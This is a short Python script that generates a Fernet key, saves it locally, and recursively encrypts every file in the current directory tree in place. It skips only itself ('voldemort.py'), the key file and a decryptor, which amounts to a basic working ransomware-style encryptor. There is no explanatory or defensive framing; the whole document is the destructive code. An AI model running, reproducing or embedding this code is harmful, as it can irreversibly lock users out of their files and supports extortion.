import os
from cryptography.fernet import Fernet

# Generate a key and save it
def generate_key():
    key = Fernet.generate_key()
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
    return key

# Get a list of files to encrypt, including those in subdirectories
def get_files_to_encrypt(base_dir):
    files = []
    for dirpath, _, filenames in os.walk(base_dir):
        for file in filenames:
            if file in {"voldemort.py", "thekey.key", "decrypt.py"}:
                continue
            files.append(os.path.join(dirpath, file))
    return files

# Encrypt files
def encrypt_files(files, key):
    cipher = Fernet(key)
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = cipher.encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        print(f"Encrypted: {file}")

# Main execution
if __name__ == "__main__":
    key = generate_key()  # Generate and save a new key
    files_to_encrypt = get_files_to_encrypt(".")  # Get list of files to encrypt in current directory and subdirectories
    print("Files to encrypt:", files_to_encrypt)
    encrypt_files(files_to_encrypt, key)  # Encrypt the files
